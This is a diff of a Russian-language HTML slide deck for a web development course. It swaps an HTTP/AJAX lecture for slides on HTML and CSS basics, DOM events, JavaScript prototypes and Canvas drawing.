@@ -1,7 +1,7 @@
 <!DOCTYPE HTML>
 <html lang="ru">
 <head>
-    <title>II. DOM &amp; AJAX</title>
+    <title>II. HTML, CSS</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=792, user-scalable=no">
     <meta http-equiv="x-ua-compatible" content="ie=edge">
@@ -9,13 +9,502 @@
 </head>
 <body class="list">
     <header class="caption">
-        <h1>II. DOM &amp; AJAX</h1>
-        <p>DOM, Events, Host Objects, AJAX, WebSocket и хранение данных.</p>
+        <h1>IV. HTML, CSS</h1>
+        <p>HTML, CSS, DOM, Events, Host Objects, .</p>
     </header>
 
     <section class="slide title">
         <h2>
-            <span>1 DOM, Events</span>
+            <span>HTML, CSS</span>
+        </h2>
+    </section>
+
+    <section class="slide">
+        <h2>DOCTYPE</h2>
+        <div>
+        <code>HTML 4</code>
+        <pre>
+            <code>&lt;!DOCTYPE HTML PUBLIC</code>
+            <code>    "-//W3C//DTD HTML 4.01 Transitional//EN"</code>
+            <code>    "http://www.w3.org/TR/html4/loose.dtd"&gt;</code>
+        </pre>
+            <code>HTML 5</code>
+        <pre>
+            <code>&lt;!DOCTYPE HTML&gt;</code>
+            <code> </code>
+        </pre>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Теги и атрибуты</h2>
+        <div>
+        <pre>
+            <code>&lt;тег атрибут1="значение" атрибут2="значение"/&gt;</code>
+            <code>&lt;тег атрибут1="значение" атрибут2="значение"&gt;...&lt;/тег&gt;</code>
+            <code>&lt;тег атрибут1="значение" атрибут2 /&gt;</code>
+            <code>&lt;!-- комментарий --&gt;</code>
+        </pre></div>
+    </section>
+
+    <section class="slide">
+        <h2>Типы тегов</h2>
+        <div>
+        <ol>
+            <li>Теги верхнего уровня</li>
+            <li>Теги заголовка документа</li>
+            <li>Комментарии</li>
+            <li>Блочные элементы</li>
+            <li>Строчные элементы</li>
+            <li>Списки</li>
+            <li>Таблицы</li>
+            <li>Формы</li>
+        </ol></div>
+    </section>
+
+    <section class="slide">
+        <h2>Блочные элементы</h2>
+        <div><pre>
+            <code>&lt;h1&gt;Заголовки&lt;/h1&gt;</code>
+            <code>&lt;p&gt;Параграф&lt;/p&gt;</code>
+            <code>&lt;div&gt;Универсальный блочный&lt;/div&gt;</code>
+            <code>Горизонтальная линия &lt;hr /&gt;</code>
+        </pre>
+        <p class="note">
+            <a href="../../d/blocks.html">Демонстрация</a>.
+        </p>
+    </div></section>
+
+    <section class="slide">
+        <h2>Строчные элементы</h2>
+        <div><pre>
+            <code>&lt;a href="http://mail.ru"&gt;Текст ссылки&lt;/a&gt;</code>
+            <code>Перевод&lt;br/&gt;строки</code>
+            <code>&lt;em&gt;<em>Акцент</em>&lt;/em&gt; и &lt;strong&gt;<strong>строгий акцент</strong>&lt;/strong&gt;</code>
+            <code>&lt;span&gt;Универсальный строчный&lt;/span&gt;</code>
+            <code>&lt;img src="pictures/logo.png" alt="Логотип" /&gt;</code>
+            <code>&lt;sub&gt;Нижний&lt;/sub&gt; и &lt;sup&gt;верхний&lt;/sup&gt; регистры</code>
+        </pre>
+        <p class="note">
+            <a href="../../d/inlines.html">Демонстрация</a>.
+        </p>
+    </div></section>
+
+    <section class="slide">
+        <h2>Спец. символы</h2>
+        <div>
+        <pre>
+            <code>&amp;nbsp; <mark class="comment">&lt;!-- неразрывный пробел --&gt;</mark></code>
+            <code>&amp;quot; <mark class="comment">&lt;!-- &quot; --&gt;</mark></code>
+            <code>&amp;lt; <mark class="comment">&lt;!-- &lt; --&gt;</mark></code>
+            <code>&amp;gt; <mark class="comment">&lt;!-- &gt; --&gt;</mark></code>
+        </pre>
+        <p class="note">
+            <a href="http://dev.w3.org/html5/html-author/charref">Справка</a>.
+        </p>
+    </div></section>
+
+    <section class="slide">
+        <h2>Списки</h2>
+        <div><pre>
+            <code>&lt;ul&gt;Нумерованный список&lt;/ul&gt; <mark class="comment">&lt;!-- Unordered List --&gt;</mark></code>
+            <code>&lt;ol&gt;Маркированный список&lt;/ol&gt; <mark class="comment">&lt;!-- Ordered List --&gt;</mark></code>
+            <code>&lt;dl&gt;Список определений&lt;/dl&gt; <mark class="comment">&lt;!-- Description List --&gt;</mark></code>
+        </pre>
+        <p class="note">
+            <a href="../../d/lists.html">Демонстрация</a>.
+        </p>
+    </div></section>
+
+    <section class="slide">
+        <h2>Таблицы</h2>
+        <div><pre>
+            <code>&lt;table&gt;</code>
+            <code>    &lt;tr&gt;&lt;th&gt;Заголовок&lt;/th&gt;&lt;/tr&gt;</code>
+            <code>    &lt;tr&gt;&lt;td&gt;Данные&lt;/td&gt;&lt;/tr&gt;</code>
+            <code>&lt;/table&gt;</code>
+        </pre>
+        <p class="note">
+            <a href="../../d/tables.html">Демонстрация</a>.
+        </p>
+    </div></section>
+
+    <section class="slide">
+        <h2>Формы</h2>
+        <div><pre>
+            <code>&lt;form&gt;</code>
+            <code>    &lt;input type="text" name="login" value="" /&gt;</code>
+            <code>    &lt;input type="password" name="password" /&gt;</code>
+            <code>    &lt;button type="submit"&gt;Войти&lt;/button&gt;</code>
+            <code>&lt;/form&gt;</code>
+        </pre>
+        <p class="note">
+            <a href="../../d/forms.html">Демонстрация</a>.
+        </p>
+    </div></section>
+
+    <section class="slide">
+        <h2>Стилизация элементов</h2>
+        <div>
+        <code>style</code>
+        <pre>
+            <code>&lt;p style="font-style: italic; color: red;"&gt;</code>
+            <code>    <span style="font-style: italic;  color: red;">Стилизованный текст.</span></code>
+            <code>&lt;/p&gt;</code>
+        </pre>
+        <code>class</code>
+        <p class="note">
+            <a href="../../d/styles.html">Демонстрация</a>.
+        </p>
+
+    </div></section>
+
+    <section class="slide">
+        <h2>CSS (Cascading Style Sheets)</h2>
+        <div>
+        <ol>
+            <li>Разграничение кода и оформления.</li>
+            <li>Уменьшение трафика.</li>
+            <li>Оформление под различные устройства.</li>
+        </ol>
+        <p class="note">
+            <a href="http://www.w3.org/TR/CSS2/">Спецификация</a>.
+        </p>
+    </div></section>
+
+    <section class="slide">
+        <h2>Подключений стилей</h2>
+        <div><pre>
+            <code>&lt;link rel="stylesheet" href="имя файла" media="тип" /&gt;</code>
+            <code>&lt;style&gt;</code>
+            <code>    <mark class="comment">/* объявление стилей */</mark></code>
+            <code>    @import "имя файла" тип;</code>
+            <code>    @import url("имя файла") тип;</code>
+            <code>&lt;/style&gt;</code>
+        </pre>
+        <p class="note">
+            <a href="../../d/css.html">Демонстрация</a>.
+        </p>
+    </div></section>
+
+    <section class="slide">
+        <h2>Типы медиа</h2>
+        <div><pre>
+            <code>all <mark class="comment">/* по умолчанию */</mark></code>
+            <code>screen <mark class="comment">/* компьютер, смартфон, планшетник */</mark></code>
+            <code>handheld <mark class="comment">/* КПК */</mark></code>
+            <code>print <mark class="comment">/* принтер */</mark></code>
+        </pre>
+    </div></section>
+
+    <section class="slide">
+        <h2>Базовый синтаксис CSS</h2>
+        <div><pre>
+            <code>селектор {</code>
+            <code>    свойство1: значение1; <mark class="comment">/* комментарий */</mark></code>
+            <code>    свойство2: значение2;</code>
+            <code>}</code>
+        </pre>
+    </div></section>
+
+    <section class="slide">
+        <h2>Типы значений</h2>
+        <div><pre>
+            <code>url("http://mail.ru/") <mark class="comment">/* строки и адреса */</mark></code>
+            <code>0.7 <mark class="comment">/* числа */</mark></code>
+            <code>90% <mark class="comment">/* проценты */</mark></code>
+            <code>#ff0000 <mark class="comment">/* цвет */</mark></code>
+            <code>rgb(255, 0, 0) <mark class="comment">/* цвет */</mark></code>
+            <code>uppercase <mark class="comment">/* ключевые слова */</mark></code>
+        </pre>
+    </div></section>
+
+    <section class="slide">
+        <h2>Относительные единицы</h2>
+        <div><pre>
+            <code>24px <mark class="comment">/* пиксели */</mark></code>
+            <code>2em <mark class="comment">/* масштабируемая единица */</mark></code>
+            <code>150% <mark class="comment">/* проценты */</mark></code>
+            <code>3ex <mark class="comment">/* высота символа x */</mark></code>
+        </pre>
+    </div></section>
+
+    <section class="slide">
+        <h2>Базовые селекторы</h2>
+        <div><pre>
+            <code>тег {} <mark class="comment">/* &lt;тег&gt;&lt;/тег&gt; */</mark></code>
+            <code>тег.класс {} <mark class="comment">/* &lt;тег class="класс"&gt;&lt;/тег&gt; */</mark></code>
+            <code>.класс {}</code>
+            <code>.класс1.класс2 {} <mark class="comment">/* &lt;тег class="класс1 класс2"&gt;&lt;/тег&gt; */</mark></code>
+            <code>#идентификатор {} <mark class="comment">/* &lt;тег id="идентификатор"&gt;&lt;/тег&gt; */</mark></code>
+        </pre>
+       <p class="note">
+            <a href="../../d/selectors.html">Демонстрация</a>.
+        </p>
+     </div></section>
+
+    <section class="slide">
+        <h2>Cелекторы атрибутов</h2>
+        <div><pre>
+            <code><mark class="comment">/* &lt;тег атрибут="значение"&gt;&lt;/тег&gt; */</mark></code>
+            <code>[атрибут] {}</mark></code>
+            <code>селектор[атрибут]{}</code>
+            <code>[атрибут="значение"] {} <mark class="comment"></mark></code>
+            <code>селектор[атрибут1="значение1"][атрибут2="значение2"] {}</code>
+        </pre>
+        <p class="note">
+            <a href="../../d/selectors.html">Демонстрация</a>.
+        </p>
+    </div></section>
+
+    <section class="slide">
+        <h2>Комбинаторы</h2>
+        <div><pre>
+            <code>селектор1 селектор2 {}</mark></code>
+            <code>селектор1 > селектор2 {}</code>
+            <code>селектор1 + селектор2 {}</mark></code>
+        </pre>
+        <p class="note">
+            <a href="../../d/selectors.html">Демонстрация</a>.
+        </p>
+    </div></section>
+
+    <section class="slide">
+        <h2>Псевдо-классы</h2>
+        <div><pre>
+            <code><mark class="comment">/* селектор:псевдокласс {} */</mark></code>
+            <code>:active <mark class="comment">/* активный элемент */</mark></code>
+            <code>:link, :visited <mark class="comment">/* непосещенные и посещенные ссылки */</mark></code>
+            <code>:hover <mark class="comment">/* элемент, находится под курсором */</mark></code>
+            <code>:focus <mark class="comment">/* элемент в фокусе */</mark></code>
+            <code>:first-child <mark class="comment">/* первый дочерний элемент */</mark></code>
+        </pre>
+        <p class="note">
+            <a href="../../d/selectors.html">Демонстрация</a>.
+        </p>
+     </div></section>
+
+    <section class="slide">
+        <h2>Каскадирование</h2>
+        <div><ol>
+            <li>Стиль браузера.</li>
+            <li>Стиль автора.</li>
+            <li>Стиль пользователя.</li>
+            <li>Стиль автора с добавлением <code>!important</code>.</li>
+            <li>Стиль пользователя с добавлением <code>!important</code>.</li>
+        </ol>
+     </div></section>
+
+    <section class="slide">
+        <h2>!important</h2>
+        <div><pre>
+            <code>селектор {</code>
+            <code>    свойство: значение !important;</code>
+            <code>}</code>
+        </pre>
+     </div></section>
+
+
+    <section class="slide">
+        <h2>Специфичность селекторов</h2>
+        <div><p>Кортеж <code>(a, b, c, d)</code>.</p>
+        <p>
+            <code>(a1, b1, c1, d1)</code> &gt; <code>(a2, b2, c2, d2)</code>, если <code>a1</code> &gt; <code>a2</code> ∨ <code>a1</code> = <code>a1</code> ∧ <code>b1</code> &gt; <code>b2</code> …
+        </p>
+        <p class="note">
+            <a href="../../d/specificity.html">Демонстрация</a>.
+        </p>
+     </div></section>
+
+    <section class="slide">
+        <h2>Свойства</h2>
+        <div><ul>
+            <li>Цвет текста (<code>color</code>) и фон (<code>background</code>)</li>
+            <li>Шрифт (<code>font</code>)</li>
+            <li>Текст (<code>text-decoration</code>, <code>text-align</code>)</li>
+            <li>Отображение (<code>display</code>)</li>
+            <li>Размеры (Box Model)</li>
+            <li>Позиционирование (<code>position</code>, <code>float</code>)</li>
+        </ul>
+     </div></section>
+
+    <section class="slide">
+        <h2><code>font</code></h2>
+        <div><pre>
+            <code>font-style: normal | italic</code>
+            <code>font-variant: normal | small-caps</code>
+            <code>font-weight: normal | bold</code>
+            <code>font-size: &lt;length&gt; | &lt;percentage&gt;</code>
+            <code>line-height: &lt;number&gt; | &lt;length&gt; | &lt;percentage&gt;</code>
+            <code>font-family:  [ &lt;family-name&gt; | &lt;generic-family&gt; ]# </code>
+        </pre>
+     </div></section>
+
+    <section class="slide">
+        <h2><code>font</code></h2>
+        <div><pre>
+            <code>font:</code>
+            <code>    [font-style||font-variant||font-weight]</code>
+            <code>    font-size [/line-height] font-family</code>
+        </pre>
+        <pre>
+            <code>h1 {</code>
+            <code>    font: bold 24px/1.5 Tahoma, sans-serif;</code>
+            <code>}</code>
+        </pre>
+     </div></section>
+
+
+    <section class="slide">
+        <h2><code>display</code></h2>
+        <div><ul>
+            <li>Блочный элемент <code>block</code></li>
+            <li>Строчный элемент <code>inline</code></li>
+            <li>Строчно-блочный элемент <code>inline-block</code></li>
+            <li>Скрытый (временно удаленный) <code>none</code></li>
+            <li>Элемент списка <code>list-item</code></li>
+            <li>Табличный элемент <code>table</code>, <code>inline-table</code>, <code>table-cell</code></li>
+        </ul>
+        <p class="note">
+            <a href="../../d/display.html">Демонстрация</a>.<br/>
+        </p>
+     </div></section>
+
+    <section class="slide">
+        <h2>Box Model</h2>
+        <div>
+            <img src="../../pics/box.png" alt="" style="margin: 0 auto; display: block;" />
+            <p class="note">
+                <a href="../../d/box.html">Демонстрация</a>.
+            </p>
+     </div></section>
+
+    <section class="slide">
+        <h2><code>margin</code></h2>
+        <div><pre>
+            <code>margin-top: &lt;length&gt; | &lt;percentage&gt; | auto</code>
+            <code>margin-right: &lt;length&gt; | &lt;percentage&gt; | auto</code>
+            <code>margin-bottom: &lt;length&gt; | &lt;percentage&gt; | auto</code>
+            <code>margin-left: &lt;length&gt; | &lt;percentage&gt; | auto</code>
+        </pre>
+     </div></section>
+
+    <section class="slide">
+        <h2><code>margin</code></h2>
+        <div><pre>
+            <code>margin: [ &lt;length&gt; | &lt;percentage&gt; | auto ]{1,4}</code>
+            <code> </code>
+            <code>margin: all </code>
+            <code>margin: vertical horizontal</code>
+            <code>margin: top horizontal bottom</code>
+            <code>margin: top right bottom left</code>
+        </pre>
+     </div></section>
+
+    <section class="slide">
+        <h2>Обтекание</h2>
+        <div><pre>
+            <code>float: left | right | none</code>
+        </pre>
+        <p class="note">
+            <a href="../../d/display.html">Демонстрация</a>.<br/>
+        </p>
+     </div></section>
+
+    <section class="slide">
+        <h2>Позиционирование</h2>
+        <div><pre>
+            <code>position: static | relative | absolute | fixed</code>
+        </pre>
+        <p class="note">
+            <a href="../../d/display.html">Демонстрация</a>.<br/>
+        </p>
+     </div></section>
+
+    <section class="slide">
+        <h2>Псевдо-элементы</h2>
+        <div><p><code>::after</code> и <code>::before</code></p>
+        <pre>
+            <code>селектор::after {</code>
+            <code>    content: "текст";</code>
+            <code>}</code>
+        </pre>
+        <p class="note">
+            <a href="../../d/display.html">Демонстрация</a>.<br/>
+        </p>
+     </div></section>
+
+    <section class="slide">
+        <h2>Схема работы браузера</h2>
+        <div><p>
+            <img src="../../pics/flow.png" alt="" style="margin: 4em auto; display: block;" />
+        </p>
+        <p class="note">
+            <a href="http://www.html5rocks.com/ru/tutorials/internals/howbrowserswork/">http://www.html5rocks.com/ru/tutorials/internals/howbrowserswork/</a>.
+        </p>
+     </div></section>
+
+    <section class="slide">
+        <h2>Независимые блоки?</h2>
+        <div><pre>
+            <code>&lt;ul class="menu"&gt;</code>
+            <code>    &lt;li class="item"&gt;</code>
+            <code>        &lt;ul class="submenu"&gt;</code>
+            <code>            &lt;li class="item"&gt;&lt;/li&gt;</code>
+        </pre>
+        <pre>
+            <code>.menu .item {}</code>
+            <code>.submenu .item {}</code>
+        </pre>
+     </div></section>
+
+    <section class="slide">
+        <h2>Независимые блоки!</h2>
+        <div><pre>
+            <code>&lt;ul class="menu"&gt;</code>
+            <code>    &lt;li class="menu__item"&gt;</code>
+            <code>        &lt;ul class="submenu"&gt;</code>
+            <code>            &lt;li class="submenu__item"&gt;&lt;/li&gt;</code>
+        </pre>
+        <pre>
+            <code>.menu__item {}</code>
+            <code>.submenu__item {}</code>
+        </pre>
+     </div></section>
+
+
+    <section class="slide">
+        <h2>БЭМ</h2>
+        <div><pre>
+            <code>блок</code>
+            <code>блок__элемент</code>
+            <code>блок_модификатор</code>
+            <code>блок__элемент_модификатор</code>
+        </pre>
+        <p class="note">
+            <a href="http://ru.bem.info/method/definitions/">БЭМ</a>.<br/>
+        </p>
+     </div></section>
+
+    <section class="slide">
+        <h2>Что не рассмотрено?</h2>
+        <div>
+            <ul>
+                <li>Мультимедия возможностии HTML;</li>
+                <li>CSS-анимации и трансорфмации;</li>
+                <li>Вендорные префиксы.</li>
+            </ul>
+        </div>
+    </section>
+
+    <header class="caption">
+        <h1>V. DOM, Events</h1>
+        <p>DOM, Events, Host Objects.</p>
+    </header>
+
+    <section class="slide title">
+        <h2>
+            <span>DOM, Events</span>
         </h2>
     </section>
 
@@ -68,6 +557,65 @@
                 <code>…</code>
                 <code>document.getElementById</code>
                 <code>…</code>
+            </pre>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Prototype</h2>
+        <div>
+            <pre>
+                <code><mark class="comment">/* Конструктор */</mark></code>
+                <code>Polygon = function(){ ... };</code>
+                <code>…</code>
+                <code><mark class="comment">/* Экземпляр */</mark></code>
+                <code>foursquare = new Polygon(4);</code>
+            </pre>
+            <p clas="note">
+                <a href="/d/prototype.html">Демонстрация</a>
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>… instanceof …</h2>
+        <div>
+            <pre>
+                <code>triangle <em>instanceof</em> Polygon <mark class="comment">// true</mark></code>
+                <code>triangle <em>instanceof</em> Triangle <mark class="comment">// true</mark></code>
+                <code>triangle <em>instanceof</em> Line <mark class="comment">// false</mark></code>
+            </pre>
+            <p clas="note">
+                <a href="/d/prototype.html">Демонстрация</a>
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>hasOwnProperty</h2>
+        <div>
+            <pre>
+                <code>triangle.<em>hasOwnProperty</em>('fillStyle') <mark class="comment">// true||false</mark></code>
+                <code>Triangle.prototype.<em>hasOwnProperty</em>('fillStyle') <mark class="comment">// true||false</mark></code>
+                <code>Trapeze.prototype.<em>hasOwnProperty</em>('getArea') <mark class="comment">// true||false</mark></code>
+                <code>triangle <em>instanceof</em> Line <mark class="comment">// false</mark></code>
+            </pre>
+            <p clas="note">
+                <a href="/d/prototype.html">Демонстрация</a>
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Функция-конструктор</h2>
+        <div>
+            <pre>
+                <code>Constructor = function() {</code>
+                <code>    if (!(this instanceof Constructor)) {</code>
+                <code>        return new Constructor();</code>
+                <code>    }</code>
+                <code>    …</code>
+                <code>};</code>
             </pre>
         </div>
     </section>
@@ -322,7 +870,7 @@
 
     <section class="slide cover h bright">
         <div>
-            <img src="/pics/event-flow.svg" alt="" />
+            <img src="../../pics/event-flow.svg" alt="" />
         </div>
     </section>
 
@@ -466,876 +1014,422 @@
         </div>
     </section>
 
+    <header class="caption">
+        <h1>VI. Canvas, three.js</h1>
+        <p>Основы работы с canvas, three.js</p>
+    </header>
+
     <section class="slide title">
         <h2>
-            <span>2 Сетевое взаимодействие</span>
+            <span>Canvas, three.js</span>
         </h2>
     </section>
 
     <section class="slide">
-        <h2>Uniform resource locator</h2>
-        <div>
-            <pre>
-                <code>scheme://domain:port/path?query_string#fragment_id</code>
-                <div class="next">
-                    <code>location.protocol <mark class="comment">/* "scheme:" */</mark></code>
-                    <code>location.hostname <mark class="comment">/* "domain" */</mark></code>
-                    <code>location.port <mark class="comment">/* "port" */</mark></code>
-                    <code>location.pathname <mark class="comment">/* "/path" */</mark></code>
-                    <code>location.search <mark class="comment">/* "?query_string" */</mark></code>
-                    <code>location.hash <mark class="comment">/* "#fragment_id" */</mark></code>
-                </div>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>HyperText Transfer Protocol</h2>
-        <div>
-            <pre>
-                <code>ПРОТОКОЛ ПРИКЛАДНОГО УРОВНЯ (7-ОЙ УРОВЕНЬ OSI)</code>
-                <code>КЛИЕНТ (ЗАПРОС) — СЕРВЕР (ОТВЕТ)</code>
-                <code>НЕ ХРАНИТ СОСТОЯНИЕ МЕЖДУ ЗАПРОСАМИ</code>
-                <code>ПРОСТ В РЕАЛИЗАЦИИ</code>
-                <code>РАСШИРЯЕМЫЙ</code>
-                <code>РАСПРОСТРАНЕННЫЙ</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>OSI</h2>
-        <div>
-            <pre>
-                <code>ФИЗИЧЕСКИЙ (СРЕДА, СИГНАЛЫ, КОДЫ)</code>
-                <code>КАНАЛЬНЫЙ (ФИЗИЧЕСКАЯ АДРЕСАЦИЯ)</code>
-                <code>СЕТЕВОЙ (ЛОГИЧЕСКАЯ АДРЕСАЦИЯ, МАРШРУТИЗАЦИЯ)</code>
-                <code>ТРАНСПОРТНЫЙ (НАДЕЖНОСТЬ)</code>
-                <code>СЕАНСОВЫЙ (СЕССИИ)</code>
-                <code>ПРЕДСТАВИТЕЛЬСКИЙ (СЖАТИЕ, ШИФРОВАНИЕ)</code>
-                <code>ПРИКЛАДНОЙ (ДОСТУП К ДАННЫМ)</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>HTTP</h2>
-        <div>
-            <pre>
-                <code>1991 HTTP/0.9</code>
-                <code>1996 HTTP/1.0</code>
-                <code>1999 HTTP/1.1</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Структура протокола</h2>
-        <div>
-            <pre>
-                <code>СТАРТОВАЯ СТРОКА <mark class="comment">// &gt;= HTTP/0.9</mark></code>
-                <code>ЗАГОЛОВКИ <mark class="comment">// &gt;= HTTP/1.0</mark></code>
-                <code>ТЕЛО СООБЩЕНИЯ <mark class="comment">// &gt;= HTTP/1.0</mark></code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>http://mail.ru/</h2>
-        <div>
-            <pre>
-                <code>GET / HTTP/1.1</code>
-                <code>Host: mail.ru</code>
-                <code>Accept: text/html,application/xhtml+xml,…</code>
-                <code>Connection: keep-alive</code>
-                <code>Accept-Encoding: gzip,deflate,sdch</code>
-                <code>Accept-Language: en-US,en;q=0.8,ru;q=0.6</code>
-                <code>User-Agent: Mozilla/5.0 … Safari/537.36</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>http://mail.ru/</h2>
-        <div>
-            <pre>
-                <code>HTTP/1.1 200 OK</code>
-                <code>Date: Sun, 16 Feb 2014 22:09:34 GMT</code>
-                <code>Server: Apache/1.3.27 (Unix) …</code>
-                <code>Content-Encoding: gzip</code>
-                <code>Connection: close</code>
-                <code>Cache-Control: no-cache,no-store,must-revalidate</code>
-                <code>…</code>
-            </pre>
-        </div>
-    </div></section>
-
-    <section class="slide">
-        <h2>http://mail.ru/</h2>
-        <div>
-            <pre>
-                <code>…</code>
-                <code>Content-Length: 50316</code>
-                <code>Content-Type: text/html; charset=utf-8</code>
-                <code> </code>
-                <code>&lt;!DOCTYPE html&gt;…</code>
-            </pre>
-        </div>
-    </div></section>
-
-    <section class="slide">
-        <h2>Методы</h2>
-        <div>
-            <pre>
-                <code>GET <mark class="comment">// ЗАПРОС ДАННЫХ</mark></code>
-                <code>POST <mark class="comment">// ПЕРЕДАЧА ДАННЫХ</mark></code>
-                <code>PUT <mark class="comment">// ЗАГРУЗКА СОДЕРЖИМОГО ЗАПРОСА</mark></code>
-                <code>DELETE <mark class="comment">// УДАЛЕНИЕ РЕСУРСА</mark></code>
-                <code>HEAD <mark class="comment">// ПОЛУЧЕНИЕ ТОЛЬКО ЗАГОЛОВКОВ</mark></code>
-                <code>OPTIONS <mark class="comment">// ОПРЕДЕЛЕНИЕ ВОЗМОЖНОСТЕЙ СЕРВЕРА</mark></code>
-                <code>…</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Коды ответов</h2>
-        <div>
-            <pre>
-                <code>ИНФОРМАЦИОННЫЕ <mark class="comment">// 1xx</mark></code>
-                <code>УСПЕШНЫЕ <mark class="comment">// 2xx</mark></code>
-                <code>ПЕРЕНАПРАВЛЕНИЕ <mark class="comment">// 3xx</mark></code>
-                <code>ОШИБКА КЛИЕНТА <mark class="comment">// 4xx</mark></code>
-                <code>ОШИБКА СЕРВЕРА <mark class="comment">// 5xx</mark></code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Коды ответов 20x–30x</h2>
-        <div>
-            <pre>
-                <code>200 <mark class="comment">// OK</mark></code>
-                <code>301 <mark class="comment">// Moved Permanently</mark></code>
-                <code>302 <mark class="comment">// Moved Temporarily</mark></code>
-                <code>304 <mark class="comment">// Not Modified</mark></code>
-            </pre>
-        </div>
-    </div></section>
-
-    <section class="slide">
-        <h2>Коды ответов 4xx</h2>
-        <div>
-            <pre>
-                <code>400 <mark class="comment">// Bad Request</mark></code>
-                <code>401 <mark class="comment">// Unauthorized</mark></code>
-                <code>404 <mark class="comment">// Not Found</mark></code>
-                <code>405 <mark class="comment">// Method Not Allowed</mark></code>
-                <code>414 <mark class="comment">// Request-URI Too Large</mark></code>
-            </pre>
-        </div>
-    </div></section>
-
-    <section class="slide">
-        <h2>Коды ответов 5xx</h2>
-        <div>
-            <pre>
-                <code>500 <mark class="comment">// Internal Server Error</mark></code>
-                <code>502 <mark class="comment">// Bad Gateway</mark></code>
-                <code>503 <mark class="comment">// Service Unavailable</mark></code>
-                <code>504 <mark class="comment">// Gateway Timeout</mark></code>
-            </pre>
-        </div>
-    </div></section>
-
-    <section class="slide shout"><div>
-        <h2>AJAX = Asynchronous JavaScript + XML</h2>
-    </section>
-
-    <section class="slide">
-        <h2>AJAX</h2>
+        <h2>Canvas</h2>
         <div>
             <figure>
                 <blockquote>
-                    <p><strong>AJAX</strong> — подход к построению интерактивных пользовательских интерфейсов веб-приложений, заключающийся в «фоновом» обмене данными браузера с веб-сервером.</p>
+                    <p>Canvas (англ. canvas — «холст», рус. канва́с) — элемент HTML5, предназначенный для создания растрового двухмерного изображения при помощи скриптования, обычно на языке JavaScript.</p>
                 </blockquote>
-                <figcaption><a href="http://ru.wikipedia.org/wiki/AJAX">Википедия</a></figcaption>
+                <figcaption><a href="http://www.w3.org/TR/2dcontext/">HTML Canvas 2D Context</a></figcaption>
             </figure>
         </div>
     </section>
 
+    <section class="slide cover w bright" style="background: #f2e8d5;">
+        <h2>Поддержка</h2>
+        <img src="../../pics/canvas-support.png" alt="" />
+    </section>
+
     <section class="slide">
-        <h2>PROs</h2>
+        <h2>2d context</h2>
         <div>
             <pre>
-                <code>ЭКОНОМИЯ ТРАФИКА</code>
-                <code>СНИЖЕНИЕ НАГРУЗКИ НА СЕРВЕР-САЙД</code>
-                <code>УСКОРЕНИЕ РЕАКЦИИ ИНТЕРФЕЙСА</code>
-                <code>ИНТЕРАКТИВНЫЙ ВОЗМОЖНОСТИ</code>
+                <code>var canvas = document.getElementById('game');</code>
+                <code>canvas.width = 300;</code>
+                <code>canvas.height = 150;</code>
+                <code>    <mark class="comment">/* HTML element */</mark></code>
+                <code>var <strong>context</strong> = canvas.getContext( '2d' );</code>
+                <code>    <mark class="comment">/* объект двумерного контекста */</mark></code>
             </pre>
         </div>
     </section>
 
     <section class="slide">
-        <h2>CONs</h2>
+        <h2>Линия</h2>
         <div>
             <pre>
-                <code>ТРУДНОСТИ ИНДЕКСИРОВАНИЯ</code>
-                <code>УСЛОЖНЕНИЕ РАЗРАБОТКИ</code>
-                <code>ТРЕБУЕТСЯ JAVASCRIPT</code>
+                <code>context.beginPath();</code>
+                <code>context.moveTo( x, y );</code>
+                <code>context.lineTo( x, y );</code>
+                <code>context.stroke();</code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/line.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Лини<span style="color:red;">и</span></h2>
+        <div>
+            <pre>
+                <code>context.beginPath();</code>
+                <code>context.moveTo( x, y );</code>
+                <code>context.lineTo( x, y );</code>
+                <code>context.lineTo( x, y );</code>
+                <code>context.stroke();</code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/lines.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Лини<span style="color:red;">и</span></h2>
+        <div>
+            <pre>
+                <code>context.lineWidth = 10;</code>
+                <code>context.lineCap = 'butt'; <mark class="comment">// butt round square</mark></code>
+                <code>context.lineJoin = 'miter'; <mark class="comment">// miter round bevel</mark></code>
+                <code>context.closePath(); <mark class="comment">// Замкнуть контур</mark></code>
+                <code>context.fill(); <mark class="comment">// Залить</mark></code>
+                <code>context.stroke(); <mark class="comment">// Обвести</mark></code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/lines.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Стилизация</h2>
+        <div>
+            <pre>
+                <code>context.fillStyle = '#000000'; <mark class="comment">// Цвет заливки</mark></code>
+                <code>context.strokeStyle = '#000000'; <mark class="comment">// Цвет обводки</mark></code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/lines.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Пунктирные линии</h2>
+        <div>
+            <pre>
+                <code>context.setLineDash([x1, x2, ...]); <mark class="comment">// Сегменты пунктира</code>
+            </pre>
+            <figure>
+                <blockquote>
+                    <p>Все сложно...</p>
+                </blockquote>
+                <figcaption>&copy; VK.COM</figcaption>
+            </figure>
+            <p class="note">
+                <a href="../../d/canvas/lines.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Прямоугольник</h2>
+        <div>
+            <pre>
+                <code>context.rect( x, y, width, height ); <mark class="comment">// Прямоугольник</mark></code>
